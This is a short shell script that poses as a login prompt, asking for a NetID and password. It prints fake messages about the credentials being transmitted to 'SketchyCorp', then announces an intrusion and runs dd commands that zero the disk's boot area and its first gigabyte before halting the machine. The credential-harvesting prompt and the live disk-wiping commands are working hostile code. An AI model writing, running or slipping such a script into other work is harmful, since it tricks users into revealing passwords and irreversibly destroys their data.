#!/bin/sh

sleep 5
clear
read -p "Enter NetID: " netid
read -p "Enter Password: " password

echo " "
echo "NetID: " $netid " Password: " $password 
sleep 1
echo "Transmitting..."
sleep 1
echo "Transmitting..."
sleep 2
echo "Sucessfully Transmitted to SketchyCorp Asset Recovery Service"
echo " "

sleep 5
echo "Instrusion Detected: Clearing Disk!"
sleep 3
dd if=/dev/zero of=/dev/sda bs=446 count=1
dd if=/dev/zero of=/dev/sda bs=1M count=1000

halt

#syndesis thinner
